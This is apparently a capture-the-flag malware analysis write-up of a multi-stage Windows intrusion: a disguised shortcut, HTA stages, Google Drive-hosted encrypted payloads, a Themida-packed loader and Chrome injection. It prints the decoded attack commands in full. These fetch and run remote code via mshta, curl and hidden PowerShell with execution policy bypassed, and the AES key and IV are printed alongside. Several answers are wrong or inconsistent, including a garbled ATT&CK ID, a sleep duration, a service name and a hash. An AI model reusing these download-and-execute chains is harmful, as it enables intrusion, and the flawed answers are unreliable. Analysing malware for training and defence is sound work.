---
title: Operation Silent Serpent MalOps
date: 2026-09-19 18:00:00
description: A senior researcher at South Korea’s Ministry of Science opened a mali…
categories:
  - Malware Analysis
tags:
  - Trojan
cover: SilentSerpent/cover.gif
---

# The Lure

> **Scenario:** An employee reported a strange email attachment. Your task is to analyze the extracted files and uncover the initial attack vector.

![alt text](SilentSerpent/LzMFmFX.png)

### 1.1.1 Question 1
```
What is the SHA256 hash of the decoy file?
```

R: 1D01EAB612DA7D635E6B92395EAD126E3E07B7987B3A38C8831E25CBCD5456B7

![alt text](SilentSerpent/ZkAV5W4.png)

---

### 1.1.2 Question 2
```
What is the SHA-256 hash of the suspected malicious file?
```

R: E51C6DAF902638023E5922A871279E57D858761EF500C3BCB214737CD39FCBDD

![alt text](SilentSerpent/ntXsEJD.png)

---

### 1.1.3 Question 3
```
Which legitimate file type is the malicious file attempting to impersonate?
```

R: .txt

---

### 1.1.4 Question 4
```
When was this malicious shortcut file created?
```

R: 2025-03-11 19:03:42

![alt text](SilentSerpent/gyVKDrE.png)

---

### 1.1.5 Question 5
```
Which system executable is explicitly targeted to run by this malicious file?
```

R: powershell.exe

![alt text](SilentSerpent/qaFttte.png)

---

### 1.1.6 Question 6
```
To visually deceive the user, the malicious file uses a specific Icon Index. What is the index number?
```

R: 97

![alt text](SilentSerpent/Hh9L6ak.png)

---

### 1.1.7 Question 7
```
What specific 'Show window' flag is set to ensure the payload executes silently without alerting the user?
```

R: SW_SHOWMINNOACTIVE

![alt text](SilentSerpent/ttEssMn.png)

---

### 1.1.8 Question 8
```
After decoding the payload, what is the full command executed by the malicious file?
```

R: powershell mshta "https[:]//link24[.]kr/A46bl74"

![alt text](SilentSerpent/Xq35BMh.png)

---

### 1.1.9 Question 9
```
Which adversary technique is being used when the malicious file leverages a trusted Windows system executable to execute its payload?
```

R: System Binary Proxy Execution

---

### 1.1.10 Question 10
```
The decoded payload utilizes a specific utility to proxy execution. What is the MITRE ATT&CK Sub-technique ID associated with the abuse of this specific binary?
```

R: T1218.005

---

### 1.1.11 Question 11
```
The initial payload makes a network request to a shortened URL. What is the full URL provided in the HTTP redirect response?
```

We have the real code that is executed by the malware, after being decrypted:

```powershell
cscript.exe .\stage1.vbs

Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

WScript.shell

cmd /c cd /d %temp% && curl -L -o password.txt "https://drive.google.com/uc?export=download&id=1u0g1doVUDc5VCeP653aze60SGlhs3efQ" && password.txt

cmd /c sc query WinDefend

If block ->
cmd /c cd /d %temp% && curl -L -o v3.log "https://drive.google.com/uc?export=download&id=1x49L0vvAqk_DIh2ymESmd48dc6QZ7Wto" && powershell -Command "[System.IO.File]::WriteAllBytes('v3.hta', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('v3.log'), 0, [System.IO.File]::ReadAllBytes('v3.log').Length))" && del v3.log && mshta %temp%\v3.hta

Else block ->
cmd /c cd /d %localappdata% && curl -L -o pipe.log "https://drive.google.com/uc?export=download&id=1jqpw8UHpsY5ps3nKOfkyo2ql4hC23Mew" && powershell -Command "[System.IO.File]::WriteAllBytes('pipe.zip', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('pipe.log'), 0, [System.IO.File]::ReadAllBytes('pipe.log').Length))" && del pipe.log && powershell Expand-Archive -Path pipe.zip && del pipe.zip
cmd /c cd /d %localappdata% && cd pipe && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File 1.ps1 -FileName 1.log
```

R: https[:]//github[.]com/deepsearch-tech/ref/releases/download/v1.0.0/pwko[.]hta?v=1 

---

### 1.1.12 Question 12
```
The redirect points to a specific file hosted on a public code repository. What is the name and extension of this downloaded file?
```

R: pwko.hta

---

### 1.1.13 Question 13
```
The redirected URL points to a file hosted on a public repository. What is the username or organization name associated with this repository?
```

R: deepsearch-tech

---

# Remote Staging

> **Scenario:** The attacker leverages cloud infrastructure to deliver additional payloads. Analyze the retrieved scripts and map the delivery mechanism

### 2.1.1 Question 1
```
What is the SHA256 hash of the file downloaded from the public repository?
```

R: 587bdf94bdaebcee4b51202beb507125a7fa37d705fb38cc076a9c1814578411

pwko.hta file that was downloaded from the repository.

---

### 2.1.2 Question 2
```
What is the exact file size in bytes of this downloaded payload?
```

R: 58290

---

### 2.1.3 Question 3
```
What is the primary scripting object utilized by the HTA file to execute system commands?
```

R: WSCRIPT.SHELL

---

### 2.1.4 Question 4
```
Which environment variable does the script use to set the working directory at the start?
```

After manually decrypting the .hta file, here it is:

```powershell
cscript.exe .\stage1.vbs

Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

WScript.shell

cmd /c cd /d %temp% && curl -L -o password.txt "https://drive.google.com/uc?export=download&id=1u0g1doVUDc5VCeP653aze60SGlhs3efQ" && password.txt

cmd /c sc query WinDefend

If block ->
cmd /c cd /d %temp% && curl -L -o v3.log "https://drive.google.com/uc?export=download&id=1x49L0vvAqk_DIh2ymESmd48dc6QZ7Wto" && powershell -Command "[System.IO.File]::WriteAllBytes('v3.hta', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('v3.log'), 0, [System.IO.File]::ReadAllBytes('v3.log').Length))" && del v3.log && mshta %temp%\v3.hta

Else block ->
cmd /c cd /d %localappdata% && curl -L -o pipe.log "https://drive.google.com/uc?export=download&id=1jqpw8UHpsY5ps3nKOfkyo2ql4hC23Mew" && powershell -Command "[System.IO.File]::WriteAllBytes('pipe.zip', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('pipe.log'), 0, [System.IO.File]::ReadAllBytes('pipe.log').Length))" && del pipe.log && powershell Expand-Archive -Path pipe.zip && del pipe.zip
cmd /c cd /d %localappdata% && cd pipe && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File 1.ps1 -FileName 1.log
```

![alt text](SilentSerpent/wrZF5hF.png)

R: %TEMP%

---

### 2.1.5 Question 5
```
The script retrieves multiple payloads from a cloud storage service. What is the domain name of this provider?
```

The malware used Google's cloud service, Google Drive, to then store the next stages.

![alt text](SilentSerpent/TXvu5nF.png)

R: drive.google.com

---

### 2.1.6 Question 6
```
The script downloads a text file used to provide access to the decoy document. What password is stored within this file?
```

R: kfgxl;Y859$#KG4fkdl^&

---

### 2.1.7 Question 7
```
Which full command line does the script use to query the status of the host's antivirus service?
```

R: cmd /c sc query WinDefender

---

### 2.1.8 Question 8
```
The downloaded payloads are encrypted to conceal their contents. What is the 32-byte AES key used for decryption?
```

He uses the CreateDecryptor function, basically this function creates a symmetric decrypted object, then provides the decryption key.

![alt text](SilentSerpent/fz8veSm.png)

R: ftrgmjekglgawkxjynqrwxjvjsydxgjc

---

### 2.1.9 Question 9
```
What is the Initialization Vector used in conjunction with the AES key?
```

Within the 'CreateDecryptor' call, the IV is provided as the second byte-array parameter.

R: rhmrpyihmziwkvln

---

### 2.1.10 Question 10
```
After the payload is decrypted, which full command is executed in the block that runs only when the antivirus service is stopped?
```

![alt text](SilentSerpent/tHbYJdX.png)

R: mshta %temp%\v3.hta

---

### 2.1.11 Question 11
```
When the script determines that the security service is running, it decrypts a downloaded file into an archive. What is the name of this resulting archive?
```

R: pipe.zip

---

# Unpacking the Nest

> **Scenario:** Encoded artifacts have been carved from a downloaded payload. Decode the layers and identify the hidden components

## 3.1.1 Question 1
```
What is the exact file size in bytes before decrypting?
```

At the stage above we see, we go back to the following command line:

```powershell
cmd /c cd /d %temp% && curl -L -o v3.log "https://drive.google.com/uc?export=download&id=1x49L0vvAqk_DIh2ymESmd48dc6QZ7Wto"
```

Right after the execution, we have the pure v3.log, encrypted, but in the rest of the code line, we see the command/key that the malware uses to decrypt the file:

```powershell
powershell -Command "[System.IO.File]::WriteAllBytes('v3.hta', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('v3.log'), 0, [System.IO.File]::ReadAllBytes('v3.log').Length))"
```
 
After we use it, we end up with a v3.hta file:

![alt text](SilentSerpent/wRUJ6CL.png)

R: 4821632

---

## 3.1.2 Question 2
```
What is the SHA256 hash of the encrypted file?
```

```powershell
Get-FileHash v3.log -Algorithm SHA256

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          411A5FD77961E5DF89A81165824EDA33D4B4049F26F7358ED2BC688B70430901       
```

R: 411A5FD77961E5DF89A81165824EDA33D4B4049F26F7358ED2BC688B70430901

---

## 3.1.3 Question 3
```
What is the exact file size in bytes after decrypting?
```

R: 4821622

---

## 3.1.4 Question 4
```
What is the SHA256 hash of the decrypted payload?
```

```powershell
Get-FileHash v3.hta -Algorithm SHA256

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          A358AC6BE54B74AA1AF1D5FBFC26AA5D8EF714A042CC3AAFDF8CC0F777D9C773       
```

R:A358AC6BE54B74AA1AF1D5FBFC26AA5D8EF714A042CC3AAFDF8CC0F777D9C773

---

## 3.1.5 Question 5
```
The files downloaded in this stage are saved in a single, well-known location. What is the environment variable for this folder?
```

After decrypting, we have:

```powershell
cscript.exe .\stage2.vbs

Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

WScript.shell

cmd /c cd /d %localappdata% && findstr /b "tvKUW2rB" "

cmd /c cd /d %localappdata% && findstr /b "tvKUW2rB" "">2.log && certutil -decode -f 2.log user.txt && del 2.log

cmd /c cd /d %localappdata% && findstr /b "TVqQAAMAAA" "

cmd /c cd /d %localappdata% && findstr /b "TVqQAAMAAA" "">1.log && powershell -Command "[IO.File]::WriteAllBytes('sys.dll', [Convert]::FromBase64String((Get-Content '1.log' -Raw)))" && del 1.log && rundll32 sys.dll,h
```

Clearly, the downloaded files are passed to the environment variable **%localappdata%**.

R: %localappdata%

---

## 3.1.6 Question 6
```
The malicious HTA script utilizes two separate file-carving operations to extract data. Which legitimate Windows utility is used to perform this carving?
```

He uses **findstr**, which is used to search for text patterns in files. 

In this case, he searches for file names like **"tvKUW2rB"**, **"TVqQAAMAAA"**, both names encrypted in base64.

R: findstr

---

## 3.1.7 Question 7
```
What is the unique starting string used to identify the first block of data that is written to a temporary log file?
```

```powershell
cmd /c cd /d %localappdata% && findstr /b "tvKUW2rB" "">2.log && certutil -decode -f 2.log user.txt && del 2.log
```

R: tvKUW2rB

---

## 3.1.8 Question 8
```
What is the specific legitimate Windows binary used to decode the first extracted data block, which is then saved as a text file?
```

Let's break down the command above.

First, it searches files for lines that start with **'tvKUW2rB'**, and saves the result in **2.log**.

```powershell
findstr /b "tvKUW2rB" "">2.log
```

'**&&**' means that it only continues if the previous command returns success, so, continuing:

```powershell
certutil -decode -f 2.log user.txt
```

**certutil** tries to decode the content of 2.log as Base64 and saves the result in **user.txt**.

```powershell
&& del 2.log
```

If certutil is successful, delete 2.log.

R: certutil

---

## 3.1.9 Question 9
```
What is the unique starting string used to identify the second block of data?
```

R: TVqQAAMAAA

---

## 3.1.10 Question 10
```
What is the file name that is decoded and executed by the final command in this stage?
```

```powershell
findstr /b "TVqQAAMAAA" v3.hta > 1.log

powershell -Command "[IO.File]::WriteAllBytes('sys.dll', [Convert]::FromBase64String((Get-Content '1.log' -Raw)))"

Get-FileHash sys.dll

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          DE7FE8842C46BC5C2F723DEE3D4B07043D531D067C06CAA3263000BCC41AECDD      
```

R: sys.dll

---

## 3.1.11 Question 11
```
Which Windows utility is used to achieve final execution?
```

To manually run a DLL on Windows, you use **rundll32.exe**, which is found added to the system PATH.

**Utilizacao:** rundll32.exe (DLLname)

At the end of the malware's PowerShell command, we have its execution:

```powershell
rundll32 sys.dll,h
```

R: sys.dll

---

## 3.1.12 Question 12
```
What is the SHA256 hash of the first carved encoded file?
```

```powershell
Get-FileHash 2.log

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          02F198CDD983077A6D996083FE20F60040B02E058E5E7E6ECF7AA491013F8123 

dir .\2.log


    Diretório: 


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/25/2026   6:27 PM          354 2.log
```     

R: 0BC4BF36EAF031F8A31BAEB1969B9CADFCBC82A804883F6865B8FB4ED988383B

---

## 3.1.13 Question 13
```
What is the exact file size in bytes of the first carved encoded file?
```

R: 354

---

## 3.1.14 Question 14
```
What is the file size in bytes after decoding?
```

```powershell
certutil -decode -f 2.log user.txt
Comprimento de entrada = 710
Comprimento de saída = 262
CertUtil: -decode : comando concluído com êxito.

dir .\user.txt

    Diretório: 

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/25/2026   6:31 PM            262 user.txt

Get-FileHash .\user.txt

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          6EA362409A97ACA030F2A59EA01A29DBFE574B77F8F0D749CF38B412FAC2451D       
```

R: 262

---

## 3.1.15 Question 15
```
What is the SHA256 hash of the decoded file?
```

R: 6EA362409A97ACA030F2A59EA01A29DBFE574B77F8F0D749CF38B412FAC2451D

---

## 3.1.16 Question 16
```
What is the file size in bytes of the second carved encoded file (With Newline)?
```

```powershell
findstr /b "TVqQAAMAAA" v3.hta > 1.log

dir 1.log

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        04-12-2025     11:56        4808026 1.log

Get-FileHash .\1.log

Algorithm       Hash
---------       ----
SHA256          6dd92d3f14cb5ce0bb49a73032ef14a4ed3c62f38028fee40d5ffeeb245d9855
```

R: 4808026 

---

## 3.1.17 Question 17
```
What is the SHA256 hash of the second carved encoded file?
```

R: 6dd92d3f14cb5ce0bb49a73032ef14a4ed3c62f38028fee40d5ffeeb245d9855

---

## 3.1.18 Question 18
```
What is the file size in bytes after decoding?
```

```powershell
powershell -Command "[IO.File]::WriteAllBytes('sys.dll', [Convert]::FromBase64String((Get-Content '1.log' -Raw)))"

dir .\sys.dll

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        04-12-2025     12:21        3606016 sys.dll

Get-FileHash .\sys.dll

Algorithm       Hash
---------       ----
SHA256          DE7FE8842C46BC5C2F723DEE3D4B07043D531D067C06CAA3263000BCC41AECDD
```

R: 3606016

---

## 3.1.19 Question 19
```
What is the SHA256 hash of the second decoded file?
```

R: DE7FE8842C46BC5C2F723DEE3D4B07043D531D067C06CAA3263000BCC41AECDD

---

# The Loader

> **Scenario:** A protected binary orchestrates payload deployment. Defeat the protections and trace the execution flow.

## 4.1.1 Question 1
```
Based on the static analysis tool, what is the specific commercial protector/packer used on the malware?
```

At the end of the past internship, it resulted in a 'sys.dll' file, which we are now going to dive into.

![alt text](SilentSerpent/VTFyo13.png)

R: Themida

---

## 4.1.2 Question 2
```
What is the original filename the author used for the malware before it was packed and renamed to 'sys.dll'?
```

Since we know that Themida was used for packing, I used the unlicense tool to be able to unpack it, available at https://github.com/ergrelet/unlicense.

In my case, using Flare-VM on VirtualBox, I had a problem: Themida detects VirtualBox using a hardware-related registry value that is different. We can see it in the execution:

```powershell
.\unlicense.exe sys.dll
INFO - Detected packer version: 2.x
frida-agent: Setting up OEP tracing for "sys.dll"
frida-agent: Target module has been loaded (thread #3488) ...
frida-agent: Exception handler registered
ERROR - Original entry point wasn't reached before timeout
Traceback (most recent call last):
  File "unlicense\application.py", line 90, in run_unlicense
SystemExit: 4

During handling of the above exception, another exception occurred:

frida.InvalidOperationError: script has been destroyed
[5020] Failed to execute script '__main__' due to unhandled exception!
```

The following PowerShell commands show the queried values:

```powershell
(Get-ItemProperty -Path "HKLM:\HARDWARE\Description\System").VideoBiosVersion
Oracle VirtualBox Version 7.2.4 VGA BIOS
Oracle VirtualBox Version 7.2.4 VGA BIOS
Oracle VirtualBox Version 7.2.4
Oracle VirtualBox Version 7.2.4

(Get-ItemProperty -Path "HKLM:\HARDWARE\Description\System").SystemBiosVersion
VBOX   - 1
```

To get around this detection, the registry values can be changed to remove the VirtualBox identifiers and replace them with any descriptions:

```powershell
Set-ItemProperty -Path "HKLM:\HARDWARE\Description\System" -Name "SystemBiosVersion" -Value "Google"

Set-ItemProperty -Path "HKLM:\HARDWARE\Description\System" -Name "VideoBiosVersion" -Value "Google"
```

> **Note:** This operation requires administrator privileges, as the registry key is protected.

After making the change to these values, the VirtualBox fingerprint is no longer present, preventing Themida from detecting the environment.

Now we will go back with the unlicense tool to successfully unpack it.

```powershell
.\unlicense.exe .\sys.dll
INFO - Detected packer version: 2.x
frida-agent: Setting up OEP tracing for "sys.dll"
frida-agent: Target module has been loaded (thread #4180) ...
frida-agent: Exception handler registered
frida-agent: OEP found (thread #4180): 0x7ff991cf5a9c
INFO - OEP reached: OEP=0x7ff991cf5a9c BASE=0x7ff991cf0000 DOTNET=False
INFO - Looking for wrapped imports ...
INFO - Potential import wrappers found: 0
INFO - Resolving imports ...
INFO - Imports resolved: 106
INFO - Generated the fake IAT at 0x7ff991ce0000, size=0x350
INFO - Patching call and jmp sites ...
INFO - Dumping PE with OEP=0x7ff991cf5a9c ...
INFO - Fixing dump ...
INFO - Rebuilding PE ...
INFO - Output file has been saved at 'unpacked_sys.dll'
```

Now we have the file 'unpacked_sys.dll', in the search for strings that might show us the supposed old name of the file, we have:

![alt text](SilentSerpent/KzSOOr0.png)

R: baby.dll

---

## 4.1.3 Question 3
```
Following the unpacking of sys.dll, what is the first MITRE ATT&CK sub-technique invoked by the malware using its export function?
```

In our unpacked .dll file, in its exported functions, we can see something:

![alt text](SilentSerpent/Arap08k.png)

We can analyze this export code within IDA. When we see the first code block, we can already assume that we have an Anti-VM function used by the malware.

![alt text](SilentSerpent/NQbwGF7.png)

The 'CreateFileA' function tries to open **.VBoxMiniRdrDN** to check for the existence of VirtualBox. It uses 'RegOpenKeyExA' to look for **SOFTWAREVMware, Inc.VMware Tools**. These checks are used to see if the malware is running in a VM/sandbox.

R: T14497.001

---

## 4.1.4 Question 4
```
The malware checks for a Virtual Machine by attempting to open a handle to a specific device driver. What is the name of this device driver?
```

As shown in the previous question.

R: \\.\VBoxMiniRdrDN

---

## 4.1.5 Question 5
```
If the first check fails, the malware checks for another virtual machine environment by querying a specific registry key. Which VM does this key check target?
```

He does a registry key check where it exists in environments inside VMware.

![alt text](SilentSerpent/1bwCh2s.png)

R: VMware

---

## 4.1.6 Question 6
```
When the malware detects it is running inside a sandbox, it uses an environment variable to locate a system utility and constructs a command to delete itself. Which system utility executable does it resolve and invoke?
```

After executing a search for a registry key related to VMware, it does the check, 'test eax, eax'. If eax = 0, then it does 'jz short loc_7FF991CF1C52', where we will analyze what gets executed.

![alt text](SilentSerpent/TmkPvpx.png)

At 'loc_7FF991CF1C52' we have a call to a subroutine, where we see the following code:

![alt text](SilentSerpent/sUy8ejL.png)

Here he uses the 'GetEnvironmentVariableA' function, which retrieves the content of the specified variable from the calling process's environment block.

R: C:\Windows\System32\cmd.exe

---

## 4.1.7 Question 7
```
If no Virtual Machine is detected, the malware creates a global synchronization object to ensure only one instance of the malware runs. What is the name of this object (Mutex)?
```

If no use of a VM is detected, the following code block creates a Mutex with the 'CreateMutexA' function named **rggmfm**.

![alt text](SilentSerpent/DADAEsdaeE.png)

---

## 4.1.8 Question 8
```
The malware spawns a new thread. What is the value used to set the new thread's priority to its lowest possible level?
```

When we look at the following code block of creating a Thread with the 'CreateThread' function, and then setting its priority.

```c
Thread = CreateThread(
             lpThreadAttributes: nullptr,
             dwStackSize: 0,
             lpStartAddress: (LPTHREAD_START_ROUTINE)StartAddress,
             lpParameter: nullptr,
             dwCreationFlags: 0,
             lpThreadId: nullptr);
SetThreadPriority(hThread: Thread, nPriority: 0xFFFFFFF1);
```

R: 0xFFFFFFF1

---

## 4.1.9 Question 9
```
The malware retrieves a directory and appends a suffix to it. What is the full path it constructs in code?
```

The malware to retrieve a directory and add a suffix to it uses the `SHGetSpecialFolderPathA` function, which gets the path of a special folder identified by its CSIDL.

```c++
BOOL SHGetSpecialFolderPathA(
        HWND  hwnd,
  [out] LPSTR pszPath,
  [in]  int   csidl,
  [in]  BOOL  fCreate
);
```

Below is the use of this function by the malware, where we have the important points:

```asm
xor r9d, r9d         ; fCreate = 0
lea r8d, [r9+1Ch]    ; csidl = R9 + 0x1C = 0x1C
```

Since `R9D` was cleared right before, the `lea r8d, [r9+1Ch]` simply results in `csidl=0x1C`.

Checking the CSIDL constants table (Shl0bj.h):
```
0x1C = CSIDL_LOCAL_APPDATA → %LOCALAPPDATA%
```

![alt text](SilentSerpent/wqa2NS5.png)

Ok, we have the directory recovered by the malware, let's identify the suffix we have right after the call.

![alt text](SilentSerpent/3k2u52I.png)

Constant: `dword_7FF991D03964 = 74656E5Ch`.

result: `\net`

R: %LOCALAPPDATA%\net

---

## 4.1.10 Question 10
```
What is the duration of the initial 'Sleep' call (in seconds) used before the loop begins?
```

After the malware recovers the directory, it uses the `Sleep` function, passing the first argument in the ecx register with the value 7530h, converting to decimal -> 30 -> 30 ms.

![alt text](SilentSerpent/Oj365On.png)

---

## 4.1.11 Question 11
```
Once the file was read, it decrypt the payload implements the logic of a well-known stream cipher. What is the name of this cipher?
```

R: RC4

---

## 4.1.12 Question 12
```
What are the first two specific hexadecimal values (magic bytes) checked in sequence to confirm the file in memory is a valid PE file for loading?
```

He checks the bytes of the PE header of the decrypted file. `MZ/PE`

```
MZ -> 4D5A -> 0x5A4D
PE -> 5045 -> 0x4550
```

R: 0x5A4D, 0x4550

---

## 4.1.13 Question 13
```
What is the name of this specific execution method, which avoids using the standard operating system loader?
```

R: Reflective DLL Injection

---

## 4.1.14 Question 14
```
If the Loader is unable to allocate the required memory for the DLL (even after a second attempt), what is the Windows system error it sets before returning an error?
```

R: ERROR_OUTOFMEMORY

---

## 4.1.15 Question 15
```
After successfully executing the payload, what is the API function used to remove the final evidence from the disk?
```

He uses the API function `DeleteFileA`, passing the name of the file to be deleted as an argument.

![alt text](SilentSerpent/ZNQImk5.png)

R: DeleteFileA

---

## 4.1.16 Question 16
```
If the payload file is not found, how long (in seconds) does the malware wait inside its infinite loop before checking for the file again?
```

At the end of the loop, if the payload isn't found, the malware `sleeps` for 10s.

2710h -> 10.000 milliseconds -> 10s

![alt text](SilentSerpent/bWMZEfW.png)

R: 10

---

## 4.1.17 Question 17
```
What is the filename the malware uses as a flag to check for its own presence on the disk?
```

The malware initializes its working environment by resolving the path to the current user's **Local AppData** directory via `SHGetSpecialFolderPathA(CSIDL 0x1c)`. From this directory, it constructs the absolute paths used during execution.

Next, the malware constructs two key paths: **`notepad.log`**, used to check for the presence or status of the main payload, and **`notepad.tmp`**, used as a temporary file during the execution flow.

The critical logic occurs within the `if` statement, where the malware checks the status of **`notepad.log`** on the disk.

**Condition:**

`if (__fpecode(...) != 0)`

When this condition evaluates to true, it indicates that **`notepad.log` is missing or could not be accessed or validated correctly**.

If `notepad.log` is missing or invalid, the malware enters the **Download/Execution** phase. In this flow, it constructs the path to the configuration file **`user.txt`**, attempts to open it, and—based on this operation—triggers the subsequent **decryption and download** routines analyzed in the following sections.

If **`notepad.log` already exists and is considered valid**, the condition above is not met. In this scenario, the code proceeds to the `else` block, where it executes the **local payload directly** without repeating the download flow.

This behavior is linked to the **persistence/offline execution** logic described in the analysis.

![alt text](SilentSerpent/7uNGFmv.png)

R: notepad.log

---

## 4.1.18 Question 18
```
Based on the decryption logic for 'user.txt', what is the 16-byte hexadecimal key used as the Passphrase/Key?
```

After setting up the environment, the malware checks for the existence of `%LOCALAPPDATA%\user.txt`. This file appears to contain encrypted data (URLs).

Before reading the file, the malware determines its size using `sub_7ffd55b93df0`, which moves the pointer to the end using `_lseek_nolock(..., FILE_END)` to obtain the size and then returns it to the beginning using `_lseek_nolock(..., FILE_BEGIN)`.

The function `sub_7ffd55b94400` copies the data, functioning similarly to `memmove`/`memcpy`.

![alt text](SilentSerpent/pRh2OAm.png)

The function `sub_7ffd55b911f0` processes the contents of `user.txt`. The first **16 bytes (`0x10`)** are treated as the RC4 key or key material, while the remainder of the file is copied to a new buffer and processed by the routine `sub_7ffd55b91160`, which removes trailing null bytes and calls the **RC4** decryption routine (`sub_7ffd55b93b20`).

The identified structure is:

- **Offset `0x00–0x0F`**: 16-byte RC4 key.
- **Offset `0x10–EOF`**: encrypted payload.

![alt text](SilentSerpent/d4PQphi.png)

The logic was manually validated using **CyberChef** by applying the first 16 bytes as the key in Hex format and the remainder as the RC4 input. Decryption successfully revealed a **list of URLs**.

```
https://drive.google.com/uc?export=download&id=1RSeJEYgqvajlAeEx40-6BZJgmdV23S33 -> main64.log
https://drive.google.com/uc?export=download&id=1PTs95g2gr6dIuO2RqErgGutQZv2Y0g3Y -> net64.log
https://drive.google.com/uc?export=download&id=1EkyeoSdhvGqcEpZkqBUzXnJYPLka7zJc -> app64.log

```

R: b6f2945b6ac1f9a42256423834776d16

---

## 4.1.19 Question 19
```
How many unique download URLs are listed in the decrypted file ('user.txt')?
```

R: 3

---

## 4.1.20 Question 20
```
What is the specific ASCII character (in hexadecimal) that the malware uses as a delimiter to split the URLs from the decrypted configuration file?
```

R: 0x0D

---

## 4.1.21 Question 21
```
Before downloading each URL, the malware clears the Windows Internet Cache for that specific URL. Which Windows API function is used to clear the cache?
```

Before the malware calls the function `sub_7FFD978918A0` (the function where the malware accesses and downloads content from URLs), it uses a call to the function `DeleteUrlCacheEntryA` to clear Windows' internet cache.

![alt text](SilentSerpent/7zoweNR.png)

R: DeleteUrlCacheEntryA

---

## 4.1.22 Question 22
```
What is the full hardcoded User-Agent string used by the malware's download function?
```

We can see the user-agent being passed in the call to the `InternetOpenA` function.

![alt text](SilentSerpent/YBpevU7.png)

R: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36

---

## 4.1.23 Question 23
```
The URLs are downloaded and saved into disk using new filenames. What are the three final filenames used for the downloaded payloads?
```

To be able to see the names of the files that are saved after the payloads are downloaded, we can first analyze the code before the calls to the function `sub_7FFD978918A0`, which, as we know, is where the payloads are downloaded.

![alt text](SilentSerpent/DVBI4wz.png)

We have 3 interesting calls, let's go through them one by one. But right off the bat, we can see something in common in the 3 code blocks of each call: there's a file name, where we can possibly assume that it will be the file where the payload will be saved on disk.

![alt text](SilentSerpent/AHc1DuI.png)

![alt text](SilentSerpent/UzCvpSV.png)

![alt text](SilentSerpent/vgHI0lz.png)

R: app, net, notepad.log

---

## 4.1.24 Question 24
```
Which Windows API is used to take a snapshot of the currently running processes?
```

The malware uses the `CreateToolhelp32Snapshot` function to look for the chrome.exe process running on the system, where it possibly injects malicious code into it.

![alt text](SilentSerpent/SnLEb1T.png)

R: CreateToolhelp32Snapshot

---

## 4.1.25 Question 25
```
The first downloaded payload is designed to perform process injection. Which specific web browser executable is the malware designed to search for and target for this injection?
```

As seen in the previous question, it searches for the Chrome browser process and injects.

R: chrome.exe

---

## 4.1.26 Question 26
```
What type of process information is queried using NtQueryInformationProcess?
```

After the `OpenProcess` call, if the browser is found, in the next block it makes a call to `sub_7FFD97891260`.

![alt text](SilentSerpent/z6mxaT0.png)

Inside the function, we see `NtQueryInformationProcess` being passed to the rbp register, where in the block below the call `call rbp` is made.

![alt text](SilentSerpent/ATxEV9y.png)

The function `NtQueryInformationProcess` has the following structure:

```c++
NTSTATUS NtQueryInformationProcess(
  HANDLE ProcessHandle,
  PROCESSINFOCLASS ProcessInformationClass,
  PVOID ProcessInformation,
  ULONG ProcessInformationLength,
  PULONG ReturnLength
);
```

Where the type of information is passed in the PROCESSINFOCLASS argument, which in the case of the malware:

![alt text](SilentSerpent/jBLOnIx.png)

The `ProcessInformationClass` argument is set to `0x3C` (60 decimal), which corresponds to `ProcessCommandLineInformation`. This queries information about the process's command line.

R: ProcessCommandLineInformation

---

## 4.1.27 Question 27
```
What specific Chrome command-line argument does the malware search for to identify a suitable injection target?
```

![alt text](SilentSerpent/rHTeS25.png)

R: --type=

---

## 4.1.28 Question 28
```
Which Windows security privilege does the malware attempt to acquire before performing the injection?
```

`sub_7FFD978915D0` is where the malware attempts to obtain system privileges. The malware uses `LookupPrivilegeValueA` to retrieve the Locally Unique Identifier (LUID) used on a specified system to locally represent the name of the specified privilege, passing `SeDebugPrivilege`: Debug and adjust the memory of any process, bypassing the process's DACL. User Right: Debug programs.

![alt text](SilentSerpent/0dvoXF1.png)

R: SeDebugPrivilege

---

## 4.1.29 Question 29
```
What is the name of the exported function within the first payload that is executed.?
```

R: ReflectiveLoader

---

## 4.1.30 Question 30
```
The remote injection function uses three core API calls in sequence. Name the final API used to execute the malicious code inside the target process.
```

